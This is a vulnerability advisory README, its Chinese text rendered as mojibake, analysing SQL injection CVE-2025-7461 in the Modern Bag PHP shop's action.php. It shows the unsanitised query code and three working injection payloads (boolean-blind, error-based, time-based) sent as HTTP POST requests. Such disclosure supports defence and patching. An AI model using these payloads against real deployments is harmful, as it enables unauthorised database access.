# Modern Bag ç”µå•†ç³»ç»Ÿ SQL æ³¨å…¥æ¼æ´åˆ†æ (CVE-2025-7461)

ğŸŒ **Language / è¯­è¨€**: [English](README.md) | **ç®€ä½“ä¸­æ–‡**

---

## æ¼æ´æ¦‚è§ˆ
æ¼æ´åº“ï¼š
[https://vuldb.com/?id.316112](https://vuldb.com/?id.316112)

é¡¹ç›®åœ°å€ï¼š
[https://code-projects.org/modern-bag-in-php-css-javascript-and-mysql-free-download/](https://code-projects.org/modern-bag-in-php-css-javascript-and-mysql-free-download/)

| é¡¹ç›® | å†…å®¹ |
| --- | --- |
| **äº§å“åç§°** | Modern Bag ç”µå•†ç³»ç»Ÿ |
| **ç‰ˆæœ¬** | V1.0 |
| **æ¼æ´ç±»å‹** | SQL æ³¨å…¥ (Boolean-based blind, Error-based, Time-based blind) |
| **å—å½±å“æ–‡ä»¶** | `/action.php` |
| **å±é™©ç­‰çº§** | ä¸­å± |
| **CVSS 3.1 è¯„åˆ†** | **6.9** |


## æ¼æ´è¯¦ç»†åˆ†æ
### æ¼æ´ä½ç½®
**ä¸»è¦æ¼æ´ç‚¹ï¼š** `action.php` ç¬¬ 272-289 è¡Œ

```php
// æ¼æ´ç‚¹
if (isset($_POST["addToProduct"])) {
    if (isset($_SESSION["uid"])) {
        $p_id = $_POST["proId"];  // ç›´æ¥è·å–ç”¨æˆ·è¾“å…¥
        $user_id = $_SESSION["uid"];
        
        // ç›´æ¥æ‹¼æ¥åˆ° SQL æŸ¥è¯¢ä¸­ï¼Œæœªè¿›è¡Œä»»ä½•è¿‡æ»¤
        $sql = "SELECT * FROM cart WHERE p_id = '$p_id' AND user_id = '$user_id'";
        $run_query = mysqli_query($con, $sql);
        $count = mysqli_num_rows($run_query);
        // ... åç»­ä»£ç 
    }
}
```

### ğŸ”¬ æ¼æ´æˆå› åˆ†æ
#### **ç¼ºä¹è¾“å…¥éªŒè¯**
```php
$p_id = $_POST["proId"]; 
```

#### **å­—ç¬¦ä¸²æ‹¼æ¥æ„é€  SQL**
```php
$sql = "SELECT * FROM cart WHERE p_id = '$p_id' AND user_id = '$user_id'";
```

#### **ç¼ºä¹é”™è¯¯å¤„ç†**
```php
$run_query = mysqli_query($con, $sql)
    or die(mysqli_error($con));  // âŒ ç›´æ¥æš´éœ²æ•°æ®åº“é”™è¯¯
```



## æ”»å‡»åˆ†æ
#### 1. **Boolean-based Blind SQL æ³¨å…¥**
```http
POST /action.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

addToProduct=1&proId=1' RLIKE (SELECT (CASE WHEN (7142=7142) THEN 1 ELSE 0x28 END))-- jeVr
```

**æ”»å‡»åŸç†ï¼š**

```sql
-- æ„é€ çš„ SQL æŸ¥è¯¢
SELECT * FROM cart WHERE p_id = '1' RLIKE (SELECT (CASE WHEN (7142=7142) THEN 1 ELSE 0x28 END))-- jeVr' AND user_id = '1'

-- å®é™…æ‰§è¡Œçš„æŸ¥è¯¢
SELECT * FROM cart WHERE p_id = '1' RLIKE (SELECT (CASE WHEN (7142=7142) THEN 1 ELSE 0x28 END))-- jeVr
```

#### 2. **Error-based SQL æ³¨å…¥**
```http
POST /action.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

addToProduct=1&proId=1' OR (SELECT 7784 FROM(SELECT COUNT(*),CONCAT(0x716a716271,(SELECT (ELT(7784=7784,1))),0x717a6b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- yVDw
```

#### 3. **Time-based Blind SQL æ³¨å…¥**
```http
POST /action.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

addToProduct=1&proId=1' AND (SELECT 9674 FROM (SELECT(SLEEP(5)))YLuC)-- ZZFJ
``` 